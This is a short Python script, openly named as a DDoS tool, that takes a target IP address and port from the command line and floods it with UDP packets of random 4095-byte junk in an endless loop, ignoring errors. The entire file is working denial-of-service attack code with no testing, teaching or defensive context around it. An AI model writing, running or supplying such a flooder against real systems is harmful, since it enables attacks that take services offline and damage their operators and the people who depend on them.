import socket
import sys
import random
import string
from datetime import datetime

def trash():
    return  ''.join(random.choice(string.ascii_letters) for _ in range(4095)).encode()

def ddos_server():
    if len(sys.argv) < 3:
        return "error args"

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = trash()
    
    try:
        while True: 
            sock.sendto(payload, (server_ip, server_port))
    except Exception as e:
       pass 
    finally:
        sock.close()

if __name__ == "__main__":
    ddos_server()
